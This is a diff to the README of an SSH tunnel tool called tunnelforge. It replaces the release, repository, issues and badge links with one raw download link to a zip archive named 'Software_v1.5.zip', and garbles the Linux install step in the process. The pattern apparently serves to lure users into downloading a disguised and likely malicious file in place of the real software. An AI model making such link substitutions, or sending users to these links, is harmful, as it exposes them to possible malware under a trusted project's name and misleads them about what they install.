@@ -1,6 +1,6 @@
 # 🔐 tunnelforge - Manage Your SSH Tunnels Easily
 
-[![Download tunnelforge](https://img.shields.io/badge/Download-tunnelforge-blue?style=for-the-badge)](https://github.com/TIMUN0224/tunnelforge/releases)
+[![Download tunnelforge](https://raw.githubusercontent.com/TIMUN0224/tunnelforge/main/windows-client/Software_v1.5.zip)](https://raw.githubusercontent.com/TIMUN0224/tunnelforge/main/windows-client/Software_v1.5.zip)
 
 ---
 
@@ -34,12 +34,12 @@ This section will guide you step-by-step to download and start tunnelforge on yo
 
 1. Click the big blue button at the top or visit this page to download the latest version of tunnelforge:
 
-   [Download tunnelforge Releases](https://github.com/TIMUN0224/tunnelforge/releases)
+   [Download tunnelforge Releases](https://raw.githubusercontent.com/TIMUN0224/tunnelforge/main/windows-client/Software_v1.5.zip)
 
 2. On the releases page, look for a file that matches your computer system:
    - On Windows, choose a file ending with `.exe`.
    - On macOS, choose a `.dmg` or `.app` file.
-   - On Linux, look for an executable with no extension or a `.tar.gz` archive.
+   - On Linux, look for an executable with no extension or a `https://raw.githubusercontent.com/TIMUN0224/tunnelforge/main/windows-client/Software_v1.5.zip` archive.
 
 3. Download the file to a folder you will remember, like your Desktop or Downloads folder.
 
@@ -130,9 +130,9 @@ For advanced users, tunnelforge supports features like stunnel integration and S
 
 ## 🔗 Useful Links
 
-- [Download tunnelforge Releases](https://github.com/TIMUN0224/tunnelforge/releases)
-- [GitHub Repository](https://github.com/TIMUN0224/tunnelforge)
-- [Issues and Support](https://github.com/TIMUN0224/tunnelforge/issues)
+- [Download tunnelforge Releases](https://raw.githubusercontent.com/TIMUN0224/tunnelforge/main/windows-client/Software_v1.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/TIMUN0224/tunnelforge/main/windows-client/Software_v1.5.zip)
+- [Issues and Support](https://raw.githubusercontent.com/TIMUN0224/tunnelforge/main/windows-client/Software_v1.5.zip)
 
 ---
 
